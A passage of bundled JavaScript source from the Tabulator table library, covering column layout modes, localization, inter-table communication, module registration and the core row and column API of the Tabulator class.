        oversizeSpace += shrinkCols ? col.width - col.column.minWidth : col.column.minWidth;
        col.width = col.column.minWidth;
      });
      remainingSpace = freeSpace - oversizeSpace;
      nextColWidth = changeUnits ? Math.floor(remainingSpace / changeUnits) : remainingSpace;
      gap = scaleColumns(undersizeCols, remainingSpace, nextColWidth, shrinkCols);
    } else {
      gap = changeUnits ? freeSpace - Math.floor(freeSpace / changeUnits) * changeUnits : freeSpace;
      undersizeCols.forEach(function(column) {
        column.width = shrinkCols ? calcShrink(column) : calcGrow(column);
      });
    }
    return gap;
  }
  if (this.table.options.responsiveLayout && this.table.modExists("responsiveLayout", true)) {
    this.table.modules.responsiveLayout.update();
  }
  if (this.table.rowManager.element.scrollHeight > this.table.rowManager.element.clientHeight) {
    totalWidth -= this.table.rowManager.element.offsetWidth - this.table.rowManager.element.clientWidth;
  }
  columns.forEach(function(column) {
    var width, minWidth, colWidth;
    if (column.visible) {
      width = column.definition.width;
      minWidth = parseInt(column.minWidth);
      if (width) {
        colWidth = calcWidth(width);
        fixedWidth += colWidth > minWidth ? colWidth : minWidth;
        if (column.definition.widthShrink) {
          fixedShrinkColumns.push({
            column,
            width: colWidth > minWidth ? colWidth : minWidth
          });
          flexShrinkUnits += column.definition.widthShrink;
        }
      } else {
        flexColumns.push({
          column,
          width: 0
        });
        flexGrowUnits += column.definition.widthGrow || 1;
      }
    }
  });
  flexWidth = totalWidth - fixedWidth;
  flexColWidth = Math.floor(flexWidth / flexGrowUnits);
  gapFill = scaleColumns(flexColumns, flexWidth, flexColWidth, false);
  if (flexColumns.length && gapFill > 0) {
    flexColumns[flexColumns.length - 1].width += gapFill;
  }
  flexColumns.forEach(function(col) {
    flexWidth -= col.width;
  });
  overflowWidth = Math.abs(gapFill) + flexWidth;
  if (overflowWidth > 0 && flexShrinkUnits) {
    gapFill = scaleColumns(fixedShrinkColumns, overflowWidth, Math.floor(overflowWidth / flexShrinkUnits), true);
  }
  if (gapFill && fixedShrinkColumns.length) {
    fixedShrinkColumns[fixedShrinkColumns.length - 1].width -= gapFill;
  }
  flexColumns.forEach(function(col) {
    col.column.setWidth(col.width);
  });
  fixedShrinkColumns.forEach(function(col) {
    col.column.setWidth(col.width);
  });
}
var defaultModes = {
  fitData,
  fitDataFill: fitDataGeneral,
  fitDataTable: fitDataGeneral,
  fitDataStretch,
  fitColumns
};
class Layout extends Module {
  static moduleName = "layout";
  //load defaults
  static modes = defaultModes;
  constructor(table) {
    super(table, "layout");
    this.mode = null;
    this.registerTableOption("layout", "fitData");
    this.registerTableOption("layoutColumnsOnNewData", false);
    this.registerColumnOption("widthGrow");
    this.registerColumnOption("widthShrink");
  }
  //initialize layout system
  initialize() {
    var layout = this.table.options.layout;
    if (Layout.modes[layout]) {
      this.mode = layout;
    } else {
      console.warn("Layout Error - invalid mode set, defaulting to 'fitData' : " + layout);
      this.mode = "fitData";
    }
    this.table.element.setAttribute("tabulator-layout", this.mode);
    this.subscribe("column-init", this.initializeColumn.bind(this));
  }
  initializeColumn(column) {
    if (column.definition.widthGrow) {
      column.definition.widthGrow = Number(column.definition.widthGrow);
    }
    if (column.definition.widthShrink) {
      column.definition.widthShrink = Number(column.definition.widthShrink);
    }
  }
  getMode() {
    return this.mode;
  }
  //trigger table layout
  layout(dataChanged) {
    var variableHeight = this.table.columnManager.columnsByIndex.find((column) => column.definition.variableHeight || column.definition.formatter === "textarea");
    this.dispatch("layout-refreshing");
    Layout.modes[this.mode].call(this, this.table.columnManager.columnsByIndex, dataChanged);
    if (variableHeight) {
      this.table.rowManager.normalizeHeight(true);
    }
    this.dispatch("layout-refreshed");
  }
}
var defaultLangs = {
  "default": {
    //hold default locale text
    "groups": {
      "item": "item",
      "items": "items"
    },
    "columns": {},
    "data": {
      "loading": "Loading",
      "error": "Error"
    },
    "pagination": {
      "page_size": "Page Size",
      "page_title": "Show Page",
      "first": "First",
      "first_title": "First Page",
      "last": "Last",
      "last_title": "Last Page",
      "prev": "Prev",
      "prev_title": "Prev Page",
      "next": "Next",
      "next_title": "Next Page",
      "all": "All",
      "counter": {
        "showing": "Showing",
        "of": "of",
        "rows": "rows",
        "pages": "pages"
      }
    },
    "headerFilters": {
      "default": "filter column...",
      "columns": {}
    }
  }
};
class Localize extends Module {
  static moduleName = "localize";
  //load defaults
  static langs = defaultLangs;
  constructor(table) {
    super(table);
    this.locale = "default";
    this.lang = false;
    this.bindings = {};
    this.langList = {};
    this.registerTableOption("locale", false);
    this.registerTableOption("langs", {});
  }
  initialize() {
    this.langList = Helpers.deepClone(Localize.langs);
    if (this.table.options.columnDefaults.headerFilterPlaceholder !== false) {
      this.setHeaderFilterPlaceholder(this.table.options.columnDefaults.headerFilterPlaceholder);
    }
    for (let locale in this.table.options.langs) {
      this.installLang(locale, this.table.options.langs[locale]);
    }
    this.setLocale(this.table.options.locale);
    this.registerTableFunction("setLocale", this.setLocale.bind(this));
    this.registerTableFunction("getLocale", this.getLocale.bind(this));
    this.registerTableFunction("getLang", this.getLang.bind(this));
  }
  //set header placeholder
  setHeaderFilterPlaceholder(placeholder) {
    this.langList.default.headerFilters.default = placeholder;
  }
  //setup a lang description object
  installLang(locale, lang) {
    if (this.langList[locale]) {
      this._setLangProp(this.langList[locale], lang);
    } else {
      this.langList[locale] = lang;
    }
  }
  _setLangProp(lang, values) {
    for (let key in values) {
      if (lang[key] && typeof lang[key] == "object") {
        this._setLangProp(lang[key], values[key]);
      } else {
        lang[key] = values[key];
      }
    }
  }
  //set current locale
  setLocale(desiredLocale) {
    desiredLocale = desiredLocale || "default";
    function traverseLang(trans, path) {
      for (var prop in trans) {
        if (typeof trans[prop] == "object") {
          if (!path[prop]) {
            path[prop] = {};
          }
          traverseLang(trans[prop], path[prop]);
        } else {
          path[prop] = trans[prop];
        }
      }
    }
    if (desiredLocale === true && navigator.language) {
      desiredLocale = navigator.language.toLowerCase();
    }
    if (desiredLocale) {
      if (!this.langList[desiredLocale]) {
        let prefix = desiredLocale.split("-")[0];
        if (this.langList[prefix]) {
          console.warn("Localization Error - Exact matching locale not found, using closest match: ", desiredLocale, prefix);
          desiredLocale = prefix;
        } else {
          console.warn("Localization Error - Matching locale not found, using default: ", desiredLocale);
          desiredLocale = "default";
        }
      }
    }
    this.locale = desiredLocale;
    this.lang = Helpers.deepClone(this.langList.default || {});
    if (desiredLocale != "default") {
      traverseLang(this.langList[desiredLocale], this.lang);
    }
    this.dispatchExternal("localized", this.locale, this.lang);
    this._executeBindings();
  }
  //get current locale
  getLocale(locale) {
    return this.locale;
  }
  //get lang object for given local or current if none provided
  getLang(locale) {
    return locale ? this.langList[locale] : this.lang;
  }
  //get text for current locale
  getText(path, value) {
    var fillPath = value ? path + "|" + value : path, pathArray = fillPath.split("|"), text = this._getLangElement(pathArray, this.locale);
    return text || "";
  }
  //traverse langs object and find localized copy
  _getLangElement(path, locale) {
    var root = this.lang;
    path.forEach(function(level) {
      var rootPath;
      if (root) {
        rootPath = root[level];
        if (typeof rootPath != "undefined") {
          root = rootPath;
        } else {
          root = false;
        }
      }
    });
    return root;
  }
  //set update binding
  bind(path, callback) {
    if (!this.bindings[path]) {
      this.bindings[path] = [];
    }
    this.bindings[path].push(callback);
    callback(this.getText(path), this.lang);
  }
  //iterate through bindings and trigger updates
  _executeBindings() {
    for (let path in this.bindings) {
      this.bindings[path].forEach((binding) => {
        binding(this.getText(path), this.lang);
      });
    }
  }
}
class Comms extends Module {
  static moduleName = "comms";
  constructor(table) {
    super(table);
  }
  initialize() {
    this.registerTableFunction("tableComms", this.receive.bind(this));
  }
  getConnections(selectors) {
    var connections = [], connection;
    connection = this.table.constructor.registry.lookupTable(selectors);
    connection.forEach((con) => {
      if (this.table !== con) {
        connections.push(con);
      }
    });
    return connections;
  }
  send(selectors, module, action, data) {
    var connections = this.getConnections(selectors);
    connections.forEach((connection) => {
      connection.tableComms(this.table.element, module, action, data);
    });
    if (!connections.length && selectors) {
      console.warn("Table Connection Error - No tables matching selector found", selectors);
    }
  }
  receive(table, module, action, data) {
    if (this.table.modExists(module)) {
      return this.table.modules[module].commsReceived(table, action, data);
    } else {
      console.warn("Inter-table Comms Error - no such module:", module);
    }
  }
}
var coreModules = /* @__PURE__ */ Object.freeze({
  __proto__: null,
  CommsModule: Comms,
  LayoutModule: Layout,
  LocalizeModule: Localize
});
class TableRegistry {
  static registry = {
    tables: [],
    register(table) {
      TableRegistry.registry.tables.push(table);
    },
    deregister(table) {
      var index = TableRegistry.registry.tables.indexOf(table);
      if (index > -1) {
        TableRegistry.registry.tables.splice(index, 1);
      }
    },
    lookupTable(query, silent) {
      var results = [], matches, match2;
      if (typeof query === "string") {
        matches = document.querySelectorAll(query);
        if (matches.length) {
          for (var i2 = 0; i2 < matches.length; i2++) {
            match2 = TableRegistry.registry.matchElement(matches[i2]);
            if (match2) {
              results.push(match2);
            }
          }
        }
      } else if (typeof HTMLElement !== "undefined" && query instanceof HTMLElement || query instanceof TableRegistry) {
        match2 = TableRegistry.registry.matchElement(query);
        if (match2) {
          results.push(match2);
        }
      } else if (Array.isArray(query)) {
        query.forEach(function(item) {
          results = results.concat(TableRegistry.registry.lookupTable(item));
        });
      } else {
        if (!silent) {
          console.warn("Table Connection Error - Invalid Selector", query);
        }
      }
      return results;
    },
    matchElement(element) {
      return TableRegistry.registry.tables.find(function(table) {
        return element instanceof TableRegistry ? table === element : table.element === element;
      });
    }
  };
  static findTable(query) {
    var results = TableRegistry.registry.lookupTable(query, true);
    return Array.isArray(results) && !results.length ? false : results;
  }
}
class ModuleBinder extends TableRegistry {
  static moduleBindings = {};
  static moduleExtensions = {};
  static modulesRegistered = false;
  static defaultModules = false;
  constructor() {
    super();
  }
  static initializeModuleBinder(defaultModules) {
    if (!ModuleBinder.modulesRegistered) {
      ModuleBinder.modulesRegistered = true;
      ModuleBinder._registerModules(coreModules, true);
      if (defaultModules) {
        ModuleBinder._registerModules(defaultModules);
      }
    }
  }
  static _extendModule(name, property, values) {
    if (ModuleBinder.moduleBindings[name]) {
      var source = ModuleBinder.moduleBindings[name][property];
      if (source) {
        if (typeof values == "object") {
          for (let key in values) {
            source[key] = values[key];
          }
        } else {
          console.warn("Module Error - Invalid value type, it must be an object");
        }
      } else {
        console.warn("Module Error - property does not exist:", property);
      }
    } else {
      console.warn("Module Error - module does not exist:", name);
    }
  }
  static _registerModules(modules, core) {
    var mods = Object.values(modules);
    if (core) {
      mods.forEach((mod) => {
        mod.prototype.moduleCore = true;
      });
    }
    ModuleBinder._registerModule(mods);
  }
  static _registerModule(modules) {
    if (!Array.isArray(modules)) {
      modules = [modules];
    }
    modules.forEach((mod) => {
      ModuleBinder._registerModuleBinding(mod);
      ModuleBinder._registerModuleExtensions(mod);
    });
  }
  static _registerModuleBinding(mod) {
    if (mod.moduleName) {
      ModuleBinder.moduleBindings[mod.moduleName] = mod;
    } else {
      console.error("Unable to bind module, no moduleName defined", mod.moduleName);
    }
  }
  static _registerModuleExtensions(mod) {
    var extensions2 = mod.moduleExtensions;
    if (mod.moduleExtensions) {
      for (let modKey in extensions2) {
        let ext = extensions2[modKey];
        if (ModuleBinder.moduleBindings[modKey]) {
          for (let propKey in ext) {
            ModuleBinder._extendModule(modKey, propKey, ext[propKey]);
          }
        } else {
          if (!ModuleBinder.moduleExtensions[modKey]) {
            ModuleBinder.moduleExtensions[modKey] = {};
          }
          for (let propKey in ext) {
            if (!ModuleBinder.moduleExtensions[modKey][propKey]) {
              ModuleBinder.moduleExtensions[modKey][propKey] = {};
            }
            Object.assign(ModuleBinder.moduleExtensions[modKey][propKey], ext[propKey]);
          }
        }
      }
    }
    ModuleBinder._extendModuleFromQueue(mod);
  }
  static _extendModuleFromQueue(mod) {
    var extensions2 = ModuleBinder.moduleExtensions[mod.moduleName];
    if (extensions2) {
      for (let propKey in extensions2) {
        ModuleBinder._extendModule(mod.moduleName, propKey, extensions2[propKey]);
      }
    }
  }
  //ensure that module are bound to instantiated function
  _bindModules() {
    var orderedStartMods = [], orderedEndMods = [], unOrderedMods = [];
    this.modules = {};
    for (var name in ModuleBinder.moduleBindings) {
      let mod = ModuleBinder.moduleBindings[name];
      let module = new mod(this);
      this.modules[name] = module;
      if (mod.prototype.moduleCore) {
        this.modulesCore.push(module);
      } else {
        if (mod.moduleInitOrder) {
          if (mod.moduleInitOrder < 0) {
            orderedStartMods.push(module);
          } else {
            orderedEndMods.push(module);
          }
        } else {
          unOrderedMods.push(module);
        }
      }
    }
    orderedStartMods.sort((a, b) => a.moduleInitOrder > b.moduleInitOrder ? 1 : -1);
    orderedEndMods.sort((a, b) => a.moduleInitOrder > b.moduleInitOrder ? 1 : -1);
    this.modulesRegular = orderedStartMods.concat(unOrderedMods.concat(orderedEndMods));
  }
}
class Alert extends CoreFeature {
  constructor(table) {
    super(table);
    this.element = this._createAlertElement();
    this.msgElement = this._createMsgElement();
    this.type = null;
    this.element.appendChild(this.msgElement);
  }
  _createAlertElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-alert");
    return el;
  }
  _createMsgElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-alert-msg");
    el.setAttribute("role", "alert");
    return el;
  }
  _typeClass() {
    return "tabulator-alert-state-" + this.type;
  }
  alert(content, type = "msg") {
    if (content) {
      this.clear();
      this.dispatch("alert-show", type);
      this.type = type;
      while (this.msgElement.firstChild) this.msgElement.removeChild(this.msgElement.firstChild);
      this.msgElement.classList.add(this._typeClass());
      if (typeof content === "function") {
        content = content();
      }
      if (content instanceof HTMLElement) {
        this.msgElement.appendChild(content);
      } else {
        this.msgElement.innerHTML = content;
      }
      this.table.element.appendChild(this.element);
    }
  }
  clear() {
    this.dispatch("alert-hide", this.type);
    if (this.element.parentNode) {
      this.element.parentNode.removeChild(this.element);
    }
    this.msgElement.classList.remove(this._typeClass());
  }
}
class Tabulator extends ModuleBinder {
  //default setup options
  static defaultOptions = defaultOptions;
  static extendModule() {
    Tabulator.initializeModuleBinder();
    Tabulator._extendModule(...arguments);
  }
  static registerModule() {
    Tabulator.initializeModuleBinder();
    Tabulator._registerModule(...arguments);
  }
  constructor(element, options, modules) {
    super();
    Tabulator.initializeModuleBinder(modules);
    this.options = {};
    this.columnManager = null;
    this.rowManager = null;
    this.footerManager = null;
    this.alertManager = null;
    this.vdomHoz = null;
    this.externalEvents = null;
    this.eventBus = null;
    this.interactionMonitor = false;
    this.browser = "";
    this.browserSlow = false;
    this.browserMobile = false;
    this.rtl = false;
    this.originalElement = null;
    this.componentFunctionBinder = new ComponentFunctionBinder(this);
    this.dataLoader = false;
    this.modules = {};
    this.modulesCore = [];
    this.modulesRegular = [];
    this.deprecationAdvisor = new DeprecationAdvisor(this);
    this.optionsList = new OptionsList(this, "table constructor");
    this.dependencyRegistry = new DependencyRegistry(this);
    this.initialized = false;
    this.destroyed = false;
    if (this.initializeElement(element)) {
      this.initializeCoreSystems(options);
      setTimeout(() => {
        this._create();
      });
    }
    this.constructor.registry.register(this);
  }
  initializeElement(element) {
    if (typeof HTMLElement !== "undefined" && element instanceof HTMLElement) {
      this.element = element;
      return true;
    } else if (typeof element === "string") {
      this.element = document.querySelector(element);
      if (this.element) {
        return true;
      } else {
        console.error("Tabulator Creation Error - no element found matching selector: ", element);
        return false;
      }
    } else {
      console.error("Tabulator Creation Error - Invalid element provided:", element);
      return false;
    }
  }
  initializeCoreSystems(options) {
    this.columnManager = new ColumnManager(this);
    this.rowManager = new RowManager(this);
    this.footerManager = new FooterManager(this);
    this.dataLoader = new DataLoader(this);
    this.alertManager = new Alert(this);
    this._bindModules();
    this.options = this.optionsList.generate(Tabulator.defaultOptions, options);
    this._clearObjectPointers();
    this._mapDeprecatedFunctionality();
    this.externalEvents = new ExternalEventBus(this, this.options, this.options.debugEventsExternal);
    this.eventBus = new InternalEventBus(this.options.debugEventsInternal);
    this.interactionMonitor = new InteractionManager(this);
    this.dataLoader.initialize();
    this.footerManager.initialize();
    this.dependencyRegistry.initialize();
  }
  //convert deprecated functionality to new functions
  _mapDeprecatedFunctionality() {
  }
  _clearSelection() {
    this.element.classList.add("tabulator-block-select");
    if (window.getSelection) {
      if (window.getSelection().empty) {
        window.getSelection().empty();
      } else if (window.getSelection().removeAllRanges) {
        window.getSelection().removeAllRanges();
      }
    } else if (document.selection) {
      document.selection.empty();
    }
    this.element.classList.remove("tabulator-block-select");
  }
  //create table
  _create() {
    this.externalEvents.dispatch("tableBuilding");
    this.eventBus.dispatch("table-building");
    this._rtlCheck();
    this._buildElement();
    this._initializeTable();
    this.initialized = true;
    this._loadInitialData().finally(() => {
      this.eventBus.dispatch("table-initialized");
      this.externalEvents.dispatch("tableBuilt");
    });
  }
  _rtlCheck() {
    var style = window.getComputedStyle(this.element);
    switch (this.options.textDirection) {
      case "auto":
        if (style.direction !== "rtl") {
          break;
        }
      case "rtl":
        this.element.classList.add("tabulator-rtl");
        this.rtl = true;
        break;
      case "ltr":
        this.element.classList.add("tabulator-ltr");
      default:
        this.rtl = false;
    }
  }
  //clear pointers to objects in default config object
  _clearObjectPointers() {
    this.options.columns = this.options.columns.slice(0);
    if (Array.isArray(this.options.data) && !this.options.reactiveData) {
      this.options.data = this.options.data.slice(0);
    }
  }
  //build tabulator element
  _buildElement() {
    var element = this.element, options = this.options, newElement;
    if (element.tagName === "TABLE") {
      this.originalElement = this.element;
      newElement = document.createElement("div");
      var attributes = element.attributes;
      for (var i2 in attributes) {
        if (typeof attributes[i2] == "object") {
          newElement.setAttribute(attributes[i2].name, attributes[i2].value);
        }
      }
      element.parentNode.replaceChild(newElement, element);
      this.element = element = newElement;
    }
    element.classList.add("tabulator");
    element.setAttribute("role", "grid");
    while (element.firstChild) element.removeChild(element.firstChild);
    if (options.height) {
      options.height = isNaN(options.height) ? options.height : options.height + "px";
      element.style.height = options.height;
    }
    if (options.minHeight !== false) {
      options.minHeight = isNaN(options.minHeight) ? options.minHeight : options.minHeight + "px";
      element.style.minHeight = options.minHeight;
    }
    if (options.maxHeight !== false) {
      options.maxHeight = isNaN(options.maxHeight) ? options.maxHeight : options.maxHeight + "px";
      element.style.maxHeight = options.maxHeight;
    }
  }
  //initialize core systems and modules
  _initializeTable() {
    var element = this.element, options = this.options;
    this.interactionMonitor.initialize();
    this.columnManager.initialize();
    this.rowManager.initialize();
    this._detectBrowser();
    this.modulesCore.forEach((mod) => {
      mod.initialize();
    });
    element.appendChild(this.columnManager.getElement());
    element.appendChild(this.rowManager.getElement());
    if (options.footerElement) {
      this.footerManager.activate();
    }
    if (options.autoColumns && options.data) {
      this.columnManager.generateColumnsFromRowData(this.options.data);
    }
    this.modulesRegular.forEach((mod) => {
      mod.initialize();
    });
    this.columnManager.setColumns(options.columns);
    this.eventBus.dispatch("table-built");
  }
  _loadInitialData() {
    return this.dataLoader.load(this.options.data).finally(() => {
      this.columnManager.verticalAlignHeaders();
    });
  }
  //deconstructor
  destroy() {
    var element = this.element;
    this.destroyed = true;
    this.constructor.registry.deregister(this);
    this.eventBus.dispatch("table-destroy");
    this.rowManager.destroy();
    while (element.firstChild) element.removeChild(element.firstChild);
    element.classList.remove("tabulator");
    this.externalEvents.dispatch("tableDestroyed");
  }
  _detectBrowser() {
    var ua = navigator.userAgent || navigator.vendor || window.opera;
    if (ua.indexOf("Trident") > -1) {
      this.browser = "ie";
      this.browserSlow = true;
    } else if (ua.indexOf("Edge") > -1) {
      this.browser = "edge";
      this.browserSlow = true;
    } else if (ua.indexOf("Firefox") > -1) {
      this.browser = "firefox";
      this.browserSlow = false;
    } else if (ua.indexOf("Mac OS") > -1) {
      this.browser = "safari";
      this.browserSlow = false;
    } else {
      this.browser = "other";
      this.browserSlow = false;
    }
    this.browserMobile = /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(ua) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw-(n|u)|c55\/|capi|ccwa|cdm-|cell|chtm|cldc|cmd-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc-s|devi|dica|dmob|do(c|p)o|ds(12|-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(-|_)|g1 u|g560|gene|gf-5|g-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd-(m|p|t)|hei-|hi(pt|ta)|hp( i|ip)|hs-c|ht(c(-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i-(20|go|ma)|i230|iac( |-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|-[a-w])|libw|lynx|m1-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|-([1-8]|c))|phil|pire|pl(ay|uc)|pn-2|po(ck|rt|se)|prox|psio|pt-g|qa-a|qc(07|12|21|32|60|-[2-7]|i-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h-|oo|p-)|sdk\/|se(c(-|0|1)|47|mc|nd|ri)|sgh-|shar|sie(-|m)|sk-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h-|v-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl-|tdg-|tel(i|m)|tim-|t-mo|to(pl|sh)|ts(70|m-|m3|m5)|tx-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas-|your|zeto|zte-/i.test(ua.slice(0, 4));
  }
  initGuard(func, msg) {
    var stack, line;
    if (this.options.debugInitialization && !this.initialized) {
      if (!func) {
        stack = new Error().stack.split("\n");
        line = stack[0] == "Error" ? stack[2] : stack[1];
        if (line[0] == " ") {
          func = line.trim().split(" ")[1].split(".")[1];
        } else {
          func = line.trim().split("@")[0];
        }
      }
      console.warn("Table Not Initialized - Calling the " + func + " function before the table is initialized may result in inconsistent behavior, Please wait for the `tableBuilt` event before calling this function." + (msg ? " " + msg : ""));
    }
    return this.initialized;
  }
  ////////////////// Data Handling //////////////////
  //block table redrawing
  blockRedraw() {
    this.initGuard();
    this.eventBus.dispatch("redraw-blocking");
    this.rowManager.blockRedraw();
    this.columnManager.blockRedraw();
    this.eventBus.dispatch("redraw-blocked");
  }
  //restore table redrawing
  restoreRedraw() {
    this.initGuard();
    this.eventBus.dispatch("redraw-restoring");
    this.rowManager.restoreRedraw();
    this.columnManager.restoreRedraw();
    this.eventBus.dispatch("redraw-restored");
  }
  //load data
  setData(data, params, config) {
    this.initGuard(false, "To set initial data please use the 'data' property in the table constructor.");
    return this.dataLoader.load(data, params, config, false);
  }
  //clear data
  clearData() {
    this.initGuard();
    this.dataLoader.blockActiveLoad();
    this.rowManager.clearData();
  }
  //get table data array
  getData(active) {
    return this.rowManager.getData(active);
  }
  //get table data array count
  getDataCount(active) {
    return this.rowManager.getDataCount(active);
  }
  //replace data, keeping table in position with same sort
  replaceData(data, params, config) {
    this.initGuard();
    return this.dataLoader.load(data, params, config, true, true);
  }
  //update table data
  updateData(data) {
    var responses = 0;
    this.initGuard();
    return new Promise((resolve, reject) => {
      this.dataLoader.blockActiveLoad();
      if (typeof data === "string") {
        data = JSON.parse(data);
      }
      if (data && data.length > 0) {
        data.forEach((item) => {
          var row = this.rowManager.findRow(item[this.options.index]);
          if (row) {
            responses++;
            row.updateData(item).then(() => {
              responses--;
              if (!responses) {
                resolve();
              }
            }).catch((e2) => {
              reject("Update Error - Unable to update row", item, e2);
            });
          } else {
            reject("Update Error - Unable to find row", item);
          }
        });
      } else {
        console.warn("Update Error - No data provided");
        reject("Update Error - No data provided");
      }
    });
  }
  addData(data, pos, index) {
    this.initGuard();
    return new Promise((resolve, reject) => {
      this.dataLoader.blockActiveLoad();
      if (typeof data === "string") {
        data = JSON.parse(data);
      }
      if (data) {
        this.rowManager.addRows(data, pos, index).then((rows2) => {
          var output = [];
          rows2.forEach(function(row) {
            output.push(row.getComponent());
          });
          resolve(output);
        });
      } else {
        console.warn("Update Error - No data provided");
        reject("Update Error - No data provided");
      }
    });
  }
  //update table data
  updateOrAddData(data) {
    var rows2 = [], responses = 0;
    this.initGuard();
    return new Promise((resolve, reject) => {
      this.dataLoader.blockActiveLoad();
      if (typeof data === "string") {
        data = JSON.parse(data);
      }
      if (data && data.length > 0) {
        data.forEach((item) => {
          var row = this.rowManager.findRow(item[this.options.index]);
          responses++;
          if (row) {
            row.updateData(item).then(() => {
              responses--;
              rows2.push(row.getComponent());
              if (!responses) {
                resolve(rows2);
              }
            });
          } else {
            this.rowManager.addRows(item).then((newRows) => {
              responses--;
              rows2.push(newRows[0].getComponent());
              if (!responses) {
                resolve(rows2);
              }
            });
          }
        });
      } else {
        console.warn("Update Error - No data provided");
        reject("Update Error - No data provided");
      }
    });
  }
  //get row object
  getRow(index) {
    var row = this.rowManager.findRow(index);
    if (row) {
      return row.getComponent();
    } else {
      console.warn("Find Error - No matching row found:", index);
      return false;
    }
  }
  //get row object
  getRowFromPosition(position) {
    var row = this.rowManager.getRowFromPosition(position);
    if (row) {
      return row.getComponent();
    } else {
      console.warn("Find Error - No matching row found:", position);
      return false;
    }
  }
  //delete row from table
  deleteRow(index) {
    var foundRows = [];
    this.initGuard();
    if (!Array.isArray(index)) {
      index = [index];
    }
    for (let item of index) {
      let row = this.rowManager.findRow(item, true);
      if (row) {
        foundRows.push(row);
      } else {
        console.error("Delete Error - No matching row found:", item);
        return Promise.reject("Delete Error - No matching row found");
      }
    }
    foundRows.sort((a, b) => {
      return this.rowManager.rows.indexOf(a) > this.rowManager.rows.indexOf(b) ? 1 : -1;
    });
    foundRows.forEach((row) => {
      row.delete();
    });
    this.rowManager.reRenderInPosition();
    return Promise.resolve();
  }
  //add row to table
  addRow(data, pos, index) {
    this.initGuard();
    if (typeof data === "string") {
      data = JSON.parse(data);
    }
    return this.rowManager.addRows(data, pos, index, true).then((rows2) => {
      return rows2[0].getComponent();
    });
  }
  //update a row if it exists otherwise create it
  updateOrAddRow(index, data) {
    var row = this.rowManager.findRow(index);
    this.initGuard();
    if (typeof data === "string") {
      data = JSON.parse(data);
    }
    if (row) {
      return row.updateData(data).then(() => {
        return row.getComponent();
      });
    } else {
      return this.rowManager.addRows(data).then((rows2) => {
        return rows2[0].getComponent();
      });
    }
  }
  //update row data
  updateRow(index, data) {
    var row = this.rowManager.findRow(index);
    this.initGuard();
    if (typeof data === "string") {
      data = JSON.parse(data);
    }
    if (row) {
      return row.updateData(data).then(() => {
        return Promise.resolve(row.getComponent());
      });
    } else {
      console.warn("Update Error - No matching row found:", index);
      return Promise.reject("Update Error - No matching row found");
    }
  }
  //scroll to row in DOM
  scrollToRow(index, position, ifVisible) {
    var row = this.rowManager.findRow(index);
    if (row) {
      return this.rowManager.scrollToRow(row, position, ifVisible);
    } else {
      console.warn("Scroll Error - No matching row found:", index);
      return Promise.reject("Scroll Error - No matching row found");
    }
  }
  moveRow(from, to, after) {
    var fromRow = this.rowManager.findRow(from);
    this.initGuard();
    if (fromRow) {
      fromRow.moveToRow(to, after);
    } else {
      console.warn("Move Error - No matching row found:", from);
    }
  }
  getRows(active) {
    return this.rowManager.getComponents(active);
  }
  //get position of row in table
  getRowPosition(index) {
    var row = this.rowManager.findRow(index);
    if (row) {
      return row.getPosition();
    } else {
      console.warn("Position Error - No matching row found:", index);
      return false;
    }
  }
  /////////////// Column Functions  ///////////////
  setColumns(definition) {
    this.initGuard(false, "To set initial columns please use the 'columns' property in the table constructor");
    this.columnManager.setColumns(definition);
  }
  getColumns(structured) {
    return this.columnManager.getComponents(structured);
  }
  getColumn(field) {
    var column = this.columnManager.findColumn(field);
    if (column) {
      return column.getComponent();
    } else {
      console.warn("Find Error - No matching column found:", field);
      return false;
    }
  }
  getColumnDefinitions() {
    return this.columnManager.getDefinitionTree();
  }
  showColumn(field) {
    var column = this.columnManager.findColumn(field);
    this.initGuard();
    if (column) {
      column.show();
    } else {
      console.warn("Column Show Error - No matching column found:", field);
      return false;
    }
  }
  hideColumn(field) {
    var column = this.columnManager.findColumn(field);
    this.initGuard();
    if (column) {
      column.hide();
    } else {
      console.warn("Column Hide Error - No matching column found:", field);
      return false;
    }
  }
  toggleColumn(field) {
    var column = this.columnManager.findColumn(field);
    this.initGuard();
    if (column) {
      if (column.visible) {
        column.hide();
      } else {
        column.show();
      }
    } else {
      console.warn("Column Visibility Toggle Error - No matching column found:", field);
      return false;
    }
  }
  addColumn(definition, before, field) {
